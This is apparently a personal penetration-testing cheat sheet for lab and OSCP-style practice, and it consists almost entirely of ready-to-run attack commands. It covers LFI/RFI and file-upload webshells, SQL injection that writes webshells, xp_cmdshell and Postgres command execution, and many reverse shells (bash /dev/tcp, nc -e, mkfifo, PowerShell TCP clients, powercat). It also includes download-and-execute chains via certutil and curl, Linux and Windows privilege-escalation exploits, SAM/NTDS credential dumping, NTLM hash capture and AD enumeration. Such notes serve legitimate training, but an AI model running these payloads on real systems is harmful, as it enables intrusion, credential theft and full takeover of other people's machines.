# Cheat sheet

# Enumeration

### Autorecon

```jsx
sudo $(which autorecon) --only-scans-dir 192.168.193.153
```

### nmap

```jsx
sudo nmap -p- -Pn -vvv --defeat-rst-ratelimit -oN nmap_all 192.168.193.153
```

```jsx
cat nmap_all | grep 'open' | awk '{ print $1 }' | awk '{print ($0+0)}' | sed -z 's/\n/,/g;s/,$/\n/'
```

```jsx
sudo nmap -v -A -Pn -oN nmap_A -p {ports} 192.168.193.153
```

```jsx
sudo nmap -p- -A --open -vvv dc01
```

```jsx
sudo nmap -sV -Pn -v -p 445 --script "vuln" 192.168.50.124
```

## FTP

```jsx
ftp -aA4 {IPv4}
```

```jsx
wget -m ftp://anonymous:anonymous@10.10.10.98
```

```jsx
hydra -V -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.157.46 ftp
```

```jsx
user
```

<aside>
💡 In FTP, binaries in ASCII mode will make the file not executable. Set the mode to `binary`.

</aside>

```jsx
echo "test" > test.txt
put test.txt
put ~/Desktop/share/php/html-php-backdoor.php html-php-backdoor.php
```

<aside>
💡 Try to do `cd ..` (in kiero it let do traversal)

</aside>

```jsx
exiftool -a -G1 FUNCTION-TEMPLATE.pdf
```

## Web

```jsx
curl -L http://192.168.248.65:9998/
```

```jsx
gobuster dir -u http://192.168.167.127:45332/ -w /usr/share/wordlists/dirb/common.txt -t 99 2>/dev/null
```

```jsx
gobuster dir -u http://192.168.121.122 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,md,php,asp,aspx -t 99 2>/dev/null
gobuster dir -u https://192.168.249.140/ -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,md,php,asp,aspx -t 99 2>/dev/null
```

```jsx
nikto -h http://192.168.121.122
```

Abuse webdav with cadavr:

```jsx
cadaver http://192.168.157.122
put /usr/share/webshells/aspx/cmdasp.aspx
```

### LFI

[File Inclusion/Path traversal | HackTricks | HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

```jsx
http://240.0.0.1:8000/backend/?view=../../../../../../../../etc/passwd
<inject the php webshell to /var!!!>
http://240.0.0.1:8000/backend/?view=../../../../../../../../var/cmd.php&cmd=whoami
```

```jsx
?page=../../../../../../../Windows/System32/drivers/etc/hosts
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers/Viewer/.ssh/id_rsa
```

```jsx
http://192.168.223.229/index.php?file=home~~.php~~ # (if no need for .php -> only can include php files!)
http://192.168.223.229/index.php?file=php://filter/convert.base64-encode/resource=upload.php
http://192.168.223.229/index.php?file=php://filter/convert.base64-encode/resource=/etc/passwd

# zip wrapper for RCE
http://192.168.223.229/index.php?file=zip://uploads/upload_1719432517.zip%23simple-backdoor.php&cmd=whoami
http://192.168.223.229/index.php?file=zip://uploads/upload_1719432517.zip%23simple-backdoor&cmd=whoami
```

<aside>
💡 If we can’t include some interesting files (uploads) / View the content via filter / Steal id_rsa.. TRY RFI!

</aside>

### RFI

```jsx
msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=9001 -o shell.php
?page=http://192.168.45.200/payload/shell.php
?page=http://192.168.45.200/php/php_reverse_shell.php
```

when we can inject a remote path, especially \\kali_ip\test (smb directory) we can use responder to get the ntlm or ntlmx relay to relay it.

```jsx
~~sudo responder -I tun0 -v~~  # recommended to use -A to avoid spoofing
~~~~sudo responder -A -I tun0 -v
```

<aside>
💡 If we cannot crack the NetNTLMv2 hash we still can try to [Relaying Net-NTLMv2](https://www.notion.so/Relaying-Net-NTLMv2-55e13d96ef574f60a44c3ea618334087?pvs=21).
In the course they showed that if admin02 is connected on files01 we can relay the NetNTLMv2 through our Kali to files02 and gain a shell on files02.

</aside>

### File upload

```jsx
$ cat .htaccess
AddType application/x-httpd-php .evil

$ cat simple-backdoor.evil
<?php
if(isset($_REQUEST['cmd'])){
		echo "<pre>";
		$cmd = ($_REQUEST['cmd']);
		system($cmd);
		echo "</pre>";
		die;
}
?>

http://192.168.204.187/uploads/simple-backdoor.evil?cmd=whoami
```

<aside>
💡 If we can upload a webshell and access it in /uploads - GG!
- Can be used with combo with directory traversal / LFI - abuse the upload path in Burp to put it in /var and then access it like here [http://240.0.0.1:8000/backend/?view=../../../../../../../../etc/passwd
<inject the php webshell to /var!!!>
http://240.0.0.1:8000/backend/?view=../../../../../../../../var/cmd.php&cmd=whoami](Cheat%20sheet%20b2ec1956b01746ed807a1363890b898f.md)

</aside>

<aside>
💡 Non executable - Could try to overwrite ssh keys:
In burp: filename=../../../../../../../root/.ssh/authorized_keys

</aside>

<aside>
💡 Good place to upload webshells: C:\xampp\htdocs\html-php-backdoor.php
We can check this path via phpinfo.php on DOCUMENT_ROOT
`curl http://192.168.120.132:45332/phpinfo.php | grep 'DOCUMENT_ROOT' | html2text`

</aside>

### OS command injection

<aside>
💡 If we have something that looks like a direct command on the os - We can try to abuse it with URL encoded ‘;’ / ‘&&’ / ‘&’.
Example from course:

curl -X POST --data 'Archive=git%3Bipconfig'
[http://192.168.50.189:8000/archive](http://192.168.50.189:8000/archive)

</aside>

## SMB

<aside>
💡 Don’t forget to try to check for write permission - for phishing and webshells!

</aside>

```jsx
smbclient -L 192.168.162.122 -N
```

```jsx
smbclient -L //192.168.195.248/ -U damon -W relia.com
smbclient -L //10.10.1.200/ -U oscp/wade
```

```jsx
smbclient //172.16.229.11/TEMP -U joe -W medtech.com
```

```jsx
crackmapexec smb 192.168.226.172 -u guest -p "" --rid-brute
```

```jsx
enum4linux -a ip
```

```jsx
impacket-smbclient -hashes 00000000000000000000000000000000:e728ecbadfb02f51ce8eed753f3ff3fd celia.almeda@10.10.114.140
```

```jsx
smbclient '//192.168.223.240/backup' -N -c 'prompt OFF;recurse ON;mget *'
```

```jsx
timeout 100
get ntds.dit
get SYSTEM
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

## SSH

```jsx
hydra -L users-ssh.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.238.122 -V -u -f -o valid-ssh-creds.txt
```

```jsx
sed -r 's/\s+//g' users.txt file
```

```jsx
ssh seppuku@192.168.177.90 -t "bash --noprofile"
```

```jsx
ssh -i root root@127.0.0.1 -o IdentitiesOnly=yes
```

### Upload own id_rsa.pub to target

```jsx
ssh-keygen                                   # create id_rsa & id_rsa.pub (DONE! ~/.ssh/id_rsa & ~/Desktop/share/authorized_keys)
~/Desktop/share/authorized_keys (id_rsa.pub) # upload this file to target under ~/home/remi/.ssh/authorized_keys
ssh -i ~/.ssh/id_rsa remi@192.168.191.231    # connect to target with {username = remi}
```

### Steal id_rsa from target

Steal /home/user/.ssh/id_rsa and login with it to the target (cracking passphrase could be required! & chmod 400 id_rsa)

<aside>
💡 Note that there could be other encryption then RSA:

By default, SSH searches for `id_rsa`, `id_dsa`, `id_ecdsa`, `id_ecdsa_sk`, `id_ed25519`, `id_ed25519_sk`

More information could be extracted from **/etc/ssh/ssh_config & /etc/ssh/sshd_config**

</aside>

## LDAP

```jsx
nmap -n -sV --script "ldap* and not brute" <IP>
```

```jsx
ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.120.108" "(objectclass=*)"
```

```jsx
ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>" > ldap_search.txt
```

```jsx
cat ldap_search.txt | grep -i "samaccountname" | cut -d: -f2 | tr -d " " > users.txt
```

```jsx
~~ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -h 192.168.120.108 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd~~
ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -H ldap://192.168.211.122 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

## DNS

```jsx
dig @192.168.162.122 AXFR hutch.offsec
```

## RPC

```jsx
rpcclient 192.168.162.122 -N
```

```jsx
rpcclient -W '' -c querydispinfo -U''%'' '192.168.181.175'
```

```jsx
rpcclient -U nagoya-industries/svc_helpdesk 192.168.167.21
# commands from Nagoya
enumdomusers
enumdomgroups
queryusergroups 0x46c
setuserinfo christopher.lewis 23 'Admin!23'
```

## SMTP

```jsx
telnet 192.168.50.8 25
help
```

## SNMP

```jsx
sudo nmap -sU -p161 --script *snmp* 192.168.240.42
```

```jsx
snmp-check 192.168.240.42
```

```jsx
snmpwalk -c public -v1 -t 10 192.168.50.151
snmpwalk -v1 -c public 192.168.189.156 1.3.6.1.4.1.8072.1.3.2.3.1.1
```

[SNMP enumeration (161,162)](https://www.notion.so/SNMP-enumeration-161-162-fd52dea43c264141a9e0dd5b07711ecb?pvs=21) - There is more specific enum

## Other voodoo unknown ports

```jsx
nc -nv 192.168.217.143 3003
help
version
```

# SQLi

```jsx
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php' 
```

```jsx
' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -'
```

<aside>
💡 We can find webshell location to upload in phpinfo (.php) DOCUMENT_ROOT

</aside>

### xp_cmdshell

```jsx
netexec mssql 10.10.137.148 -u sql_svc -p Dolphin1
impacket-mssqlclient svc_mssql:'Service1'@240.0.0.1 -windows-auth

# option from Nagoya
enable_xp_cmdshell
xp_cmdshell whoami

# Classic from the course
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';

EXECUTE xp_cmdshell 'powershell iwr -uri http://10.10.137.147:8888/nc64.exe -OutFile C:/Users/Public/nc64.exe';
EXECUTE xp_cmdshell 'C:/Users/Public/nc64.exe 10.10.137.147 443 -e cmd';
```

### Postgres RCE

```jsx
psql -h 240.0.0.1 -p 5432 -U postgres -d webapp

DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

# Reverse shell
COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.160 443 >/tmp/f';
```

### Bypass auth

[SecLists/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt at master · danielmiessler/SecLists](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt?source=post_page-----7e777892e485--------------------------------)

# Client-side attack

### Webdav - Email - Library-ms

We can try to use the reverse shell as in Client-Side attacks in the course: [mkdir /home/kali/webdav
touch /home/kali/webdav/test.txt
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/Desktop/webdav/](https://www.notion.so/mkdir-home-kali-webdav-touch-home-kali-webdav-test-txt-home-kali-local-bin-wsgidav-host-0-0-0--259879d4893145ad979a04afccf7a7c7?pvs=21) (There is also swaks usage to put as email)

### .lnk

Grab NetNTLMv2 hash with responder with ‘hashgrab.py’ (in /Desktop/share/ClientSide)

```jsx
python hashgrab.py 192.168.45.207 test   # run hashgrab and create payloads 
sudo responder -I tun0 -v                # run responder in another terminal
smbclient //192.168.181.30/nara          # connect to the smb share
cd Documents                             # go to the correct folder
put test.ln                              # upload the test.lnk created by hashgrab.py

# put the hash in hash file and crack
john hash -wordlist=/usr/share/wordlists/rockyou.txt
```

### .doc / .odt

Grab NetNTLMv2 hash with ‘badodt.py’ (in /Desktop/share/ClientSide):

```jsx
python badodt.py
sudo responder -I tun0 -v -A
```

Get reverse shell:

We can craft an odt/ods files in libre like here: [ODT from Craft PG Practice](https://www.notion.so/ODT-from-Craft-PG-Practice-862cd2f384bd4c9da5d8512f59a6b8d3?pvs=21) 

via email (like in Hepet):

```jsx
sendemail -f 'jonas@localhost' \
                       -t 'mailadmin@localhost' \
                       -s 192.168.226.140:25 \
                       -u 'Your spreadsheet' \
                       -m 'Here is your requested spreadsheet' \
                       -a test.odt
```

Or just by uploading in a web page like Craft.

# Reverse Shells

[Online - Reverse Shell Generator](https://www.revshells.com/)

Generic way to find if we get packets from target:

```jsx
sudo tcpdump -i tun0 icmp -v
# payload: 
ping -c 5 192.168.45.226
# url encoded payload:
ping%20-c%205%20192.168.45.226
```

## Linux

```jsx
bash -c "bash -i >& /dev/tcp/192.168.45.197/443 0>&1"
```

```jsx
nc 192.168.45.239 4444 -e /bin/bash
```

<aside>
💡 /usr/bin/bash
/usr/bin/nc
/usr/bin/wget
/usr/bin/curl
 **could be the case as well!**

</aside>

```jsx
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.213/443 0>&1'");
?>
```

```jsx
wget 192.168.45.194/payload/bash-shell -O /tmp/shell
chmod +x /tmp/shell
/tmp/shell
```

```jsx
busybox nc 192.168.45.218 443 -e sh
```

### TTY Linux

```jsx
which python / which python3

python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
stty raw -echo;fg
reset
xterm
```

## Windows

```jsx
powershell -Command whoami
```

PowerShell - one-liner:

```jsx
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe%20-enc%20<base64 encoded payload>
```

```jsx
powershell $client = New-Object System.Net.Sockets.TCPClient("192.168.45.205",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

PowerShell + Powercat

```jsx
powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.191/powercat.ps1');powercat -c 192.168.45.191 -p 443 -e powershell

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.168/powercat.ps1'); powercat -c 192.168.45.168 -p 443 -e cmd.exe

cmd /c "powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.197/powercat.ps1'); powercat -c 192.168.45.197 -p 443 -e cmd.exe"
```

Msfvenom based

```jsx
//32 bit
msfvenom -p windows/shell_reverse_tcp -f exe -o shell.exe LHOST=192.168.45.3 LPORT=443
//64 bit
msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=192.168.45.3 LPORT=443
//download + execute (2 stage)
certutil -urlcache -split -f http://192.168.45.3/shell.exe C:/Windows/Temp/shell.exe
C:/Windows/Temp/shell.exe
```

PHP custom two stager - Windows

```jsx
<?php
$download = system('certutil.exe -urlcache -split -f http://192.168.45.210/shell.exe shell.exe', $val)
?>
```

```jsx
<?php
$exec = system('shell.exe', $val)
?>
```

### SMB Sharing+ CMD reverse shell (use when other payloads don’t work)

```jsx
python /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support Share ~/Desktop/scripts/shells
```

example of usage:

```jsx
cmd /c //192.168.45.213/Share/nc.exe -e cmd.exe 192.168.45.213 4444
```

Refer to here next: [Got shitty cmd shell?](Cheat%20sheet%20b2ec1956b01746ed807a1363890b898f.md) 

# Privilege escalation

## Linux

<aside>
💡 Please get some TTY 🙂 [TTY Linux](Cheat%20sheet%20b2ec1956b01746ed807a1363890b898f.md)

</aside>

### Enumeration

```jsx
wget http://192.168.49.136/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
```

```jsx
id
sudo -l
cat /etc/crontab
# linpeas can show more like ls /etc/cron.d
env
cat .bashrc
ps aux
uname -a
```

```jsx
find . | sed -e "s/[^-][^\/]*\// |/g" -e "s/|\([^ ]\)/|-\1/"
```

```jsx
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
getcap -r / 2>/dev/null
```

<aside>
💡 Any Interesting **binaries** we can search of **gtfobins** or search an **exploit** for it (local privilege escalation) or run **strings**!

</aside>

```jsx
find / -type d -name '.git' 2>/dev/null
# go to one dir above .git
git status
git log
git diff <commit>
```

```jsx
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 && chmod +x pspy32 && ./pspy32
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 && chmod +x pspy64 && ./pspy64
# with timeout 180sec
wget http://192.168.45.218/pspy64 && chmod +x pspy64 && timeout 180s ./pspy64
```

```jsx
chmod +s /bin/bash
```

```jsx
systemctl --type=service --state=running
systemctl status app.service
cat /etc/systemd/system/app.service
```

```jsx
mysql -u school -p'@jCma4s8ZM<?kA' -h localhost
show databases;
use <database>;
show tables;
describe <table_name>;
select * from <table_name>;
```

```jsx
psql -h 240.0.0.1 -p 5432 -U postgres -d webapp
\list
\c <database>
\d
\d+ users
SELECT * FROM users;
```

### Exploits

<aside>
💡 Try the suggested linpeas exploit. Could maybe use one of those:

</aside>

Sudo Baron Samedit (Sudo <1.9.5p2)

```jsx
wget http://192.168.45.218/SudoBaron/exploit_nss.py
python3 exploit_nss.py
```

[https://github.com/worawit/CVE-2021-3156](https://github.com/worawit/CVE-2021-3156)

PwnKit (SUID pkexec)

```jsx
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
```

[https://github.com/ly4k/PwnKit](https://github.com/ly4k/PwnKit)

DirtyCow (Linux kernel <4.8.3)

[https://github.com/dirtycow/dirtycow.github.io](https://github.com/dirtycow/dirtycow.github.io)

Dirty pipe (Linux kernel >5.8)

```jsx
wget http://192.168.49.136/DirtyPipe/compile.sh
wget http://192.168.49.136/DirtyPipe/exploit-1.c
wget http://192.168.49.136/DirtyPipe/exploit-2.c
chmod +x compile.sh
./compile.sh
./exploit-1
# or
./exploit-2
```

[GitHub - AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits: A collection of exploits and documentation that can be used to exploit the Linux Dirty Pipe vulnerability.](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/tree/main)

Polkit (version >0.113)

[https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation)

### Root Tricks - Writable sudoers/passwd

```jsx
'echo "user ALL=(root) NOPASSWD: ALL" > /etc/sudoers'
```

```jsx
openssl passwd 123
root2:{HASH}:0:0:root:/root:/bin/bash
```

[Writable /etc/passwd → Root](https://www.notion.so/Writable-etc-passwd-Root-7b5d52c6cf954cc79a13813a525c68e8?pvs=21) 

## Windows

[Windows Local Privilege Escalation | HackTricks | HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)

### Users | Groups

```jsx
whoami
whoami /priv
whoami /groups
net user
Get-LocalUser
net user steve
Get-LocalUser steve
net group
Get-LocalGroup
Get-LocalGroupMember Administrators
net localgroup administrators
```

### System

```jsx
systeminfo
hostname
ipconfig
Get-ADdomain
netstat -a
tree \users\ /f /a
```

### PowerShell history

```jsx
Get-History
(Get-PSReadlineOption).HistorySavePath
type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\Users\Lance.Rubens\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### Enumeration Files | Services | Tasks

```jsx
Get-ChildItem Env: | ft Key,Value
```

```jsx
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.kdbx,*.log -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

```jsx
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

icacls "C:\Program Files\MilleGPG5\GPGService.exe"
stop-service GPGOrchestrator
copy shell.exe "C:\Program Files\MilleGPG5\GPGService.exe"
start-service GPGOrchestrator

sc.exe qc VeyonService
move veyon-service.exe veyon-service.bak
move shell64.exe veyon-service.exe
shutdown /r /t 0
```

```jsx
schtasks /query /fo LIST /v | Select-String -Pattern "TaskName:"
schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run:"

schtasks /query /fo LIST /v /tn \Microsoft\CacheCleanup
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
```

### Git

```jsx
gci -Recurse -Filter ".git" -Directory -ErrorAction SilentlyContinue -Path "C:\Users\"
```

```jsx
git clone https://github.com/arthaud/git-dumper.git
python -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
python git_dumper.py http://192.168.217.144/.git ~/Documents/oscpA/git144
```

```jsx
takeown /F <dir> /R
git log
git diff <commit hash>
```

### Service Hijacking

```jsx
Restart-Service -Name 'mysql'
shutdown /r /t 0
```

### PATH & ENV

```jsx
get-childitem env:
```

```jsx
echo %PATH%
get-childitem env:path | Format-List *
certutil -urlcache -split -f http://192.168.45.214/shell.dll C:\Users\emma\AppData\Local\Microsoft\WindowsApps\BetaLibrary.Dll
```

### AlwaysInstallElevated

```jsx
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.154 LPORT=445 -f msi > notavirus.msi
msiexec /i notavirus.msi
```

### WinPEASx64.exe

```jsx
certutil -split -urlcache -f http://192.168.45.218/winPEASx64.exe \windows\temp\winpeas.exe
\windows\temp\winpeas.exe
```

### **SeRestorePrivilege**

```jsx
# Enable the privilege (Can skip if Enabled already)
wget https://raw.githubusercontent.com/gtworek/PSBits/master/Misc/EnableSeRestorePrivilege.ps1
certutil -urlcache -split -f http://192.168.45.211/EnableSeRestorePrivilege.ps1
./EnableSeRestorePrivilege.ps1

# Abuse with RDP - Change binary in system32
move C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
move C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
rdesktop 192.168.224.165
# press Win+U

# If shell drops we can add user to admin group with fast typing
net localgroup administrators enox /add
```

[Abusing Tokens | HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#table)

### SeBackupPrivilege

```jsx
mkdir C:\temp
reg save hklm\sam C:\temp\sam.hive
reg save hklm\system C:\temp\system.hive
# download the files to Kali
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

### SeManageVolumePrivilege

```jsx
certutil -urlcache -split -f http://192.168.45.214/SeManageVolumeExploit.exe
\SeManageVolumeExploit.exe

msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.214 LPORT=443 -f dll -o Printconfig.dll
certutil -split -urlcache -split -f http://192.168.45.214/payload/Printconfig.dll
copy Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\
# press Yes

nc -lvnp 443 # setup listener on KALI

# on target - run trigger
powershell
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
$object = [Activator]::CreateInstance($type)
# should get nt authority\system shell
```

There is another trigger we can use (Report.wer and WerTrigger.exe in /bin in repo):

[GitHub - sailay1996/WerTrigger: Weaponizing for privileged file writes bugs with windows problem reporting](https://github.com/sailay1996/WerTrigger/tree/master)

### Invoke-RunasCs.ps1

Allows to run commands as another user locally

```jsx
certutil -split -urlcache -f http://192.168.45.197/Invoke-RunasCs.ps1
Import-Module .\Invoke-RunasCs.ps1
Invoke-RunasCs svc_mssql trustno1 "C:\xampp\htdocs\uploads\shell64.exe"
```

```jsx
runas /env /profile /user:DVR4\Administrator "C:\temp\nc.exe -e cmd.exe 192.168.118.14 443"
runas /user:oscp\bernie cmd.exe
# With RDP we can run as administrator (cmd) and type cleartext creds of other admin user
```

### Check if service 32/64 bit

It is important so the payload will be correct arch. Use this powershell script:

```jsx
Add-Type -MemberDefinition @'
[DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool IsWow64Process(
    [In] System.IntPtr hProcess,
    [Out, MarshalAs(UnmanagedType.Bool)] out bool wow64Process);
'@ -Name NativeMethods -Namespace Kernel32

Get-Process "FJTWSVIC" | Foreach {
    $is32Bit=[int]0 
    if ([Kernel32.NativeMethods]::IsWow64Process($_.Handle, [ref]$is32Bit)) { 
        "$($_.Name) $($_.Id) is $(if ($is32Bit) {'32-bit'} else {'64-bit'})" 
    } 
    else {"IsWow64Process call failed"}

```

so the payload which we generate will be x86:

```jsx
msfvenom -p windows/shell_reverse_tcp -f dll -o UninOldIS.dll LHOST=192.168.45.213 LPORT=443
```

### Got shitty cmd shell?

```jsx
set PATH=%SystemRoot%\system32;%SystemRoot%;
%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe
```

```jsx
%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass .\exploit.ps1
```

### Cross-Compile

```bash
i686-w64-mingw32-gcc 40564.c -o pwn.exe -lws2_32
```

```jsx
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

### PrintSpoofer

```jsx
iwr -uri http://10.10.137.147:8888/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
.\PrintSpoofer64.exe -i -c powershell.exe
```

if error jumps during download try:

```jsx
$ProgressPreference = "SilentlyContinue"
-UseBasicParsing (required -Outfile)
```

### Potatoes

**JuicyPotatoNG**

```jsx
cd \Windows\Temp
certutil -urlcache -split -f http://192.168.45.234/JuicyPotatoNG.exe
.\JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami > C:\test.txt"
certutil -urlcache -split -f http://192.168.45.234/nc64.exe
.\JuicyPotatoNG.exe -t * -p "C:\Windows\Temp\nc64.exe" -a "192.168.45.234 443 -e cmd.exe"
```

[https://github.com/antonioCoco/JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG)

**GodPotato**

```jsx
certutil -urlcache -split -f http://192.168.45.247/GodPotato/GodPotato-NET4.exe
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "cmd /c C:/Windows/Temp/shell.exe"

.\GodPotato-NET4.exe -cmd "nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.247 443"
net user /add [username] [password]
net localgroup administrators [username] /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

```jsx
net user /add kali SuperPass123!
net localgroup administrators kali /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

[https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)

**SweetPotato**

Download: https://github.com/carr0t2/SweetPotato/releases/tag/v1.0.0

```jsx
.\SweetPotato.exe -e EfsRpc -p c:\Users\Public\nc.exe -a "10.10.10.10 1234 -e cmd"
```

[https://github.com/CCob/SweetPotato](https://github.com/CCob/SweetPotato)

**JuicyPotato (x86)**

Download: https://github.com/ivanitlearning/Juicy-Potato-x86/releases

Get CLSID: [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

```jsx
Juicy.Potato.x86.exe -c {CLSID} -t * -l 443 -p "C:\Temp\nc.exe" -a "192.168.45.194 443 -e cmd" 
```

[juicy-potato/CLSID at master · ohpe/juicy-potato](https://github.com/ohpe/juicy-potato/tree/master/CLSID)

Video: [https://www.youtube.com/watch?v=k9p6wZO7RyY](https://www.youtube.com/watch?v=k9p6wZO7RyY)

# Active Directory

[Domain Enumeration + Exploitation | burmat / nathan burchfield](https://burmat.gitbook.io/security/hacking/domain-exploitation)

```jsx
net users
net users /domain
net groups /domain
net localgroup administrators
```

## PowerView

```jsx
certutil -urlcache -split -f http://192.168.45.226/PowerView.ps1
iwr -uri http://10.10.170.141:8080/PowerView.ps1 -UseBasicParsing -OutFile C:\Users\celia.almeda\Documents\PowerView.ps1
Import-Module .\PowerView.ps1

IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.45.171/PowerView.ps1')
```

[PowerView/SharpView | HackTricks | HackTricks](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview)

```jsx
Get-DomainController
Get-NetComputer | select samaccountname, operatingsystem
Get-DomainUser | select cn, samaccountname, memberof
Get-DomainGroupMember -Identity "Domain Admin" -Recurse
Invoke-UserHunter -CheckAccess
Get-NetLoggedon -ComputerName <servername>
Get-NetSession -ComputerName <servername>
Get-DomainUser -PreauthNotRequired
Get-DomainUser -SPN | select name

Find-DomainShare -CheckShareAccess
Find-LocalAdminAccess
Invoke-UserHunter -GroupName "RDPUsers"
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount

Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | fl
Find-InterestingDomainAcl -ResolveGUIDs
Get-GPO -Guid 31B2F340-016D-11D2-945F-00C04FB984F9

```

```jsx
# Get Domain Controller
# Get Computers + OS
# Get Users + groups
# Check Domain Admins
# Check access to PC with Domain Admin session on
# Check Logged on sessions (Need admin - if successful we are local admin)
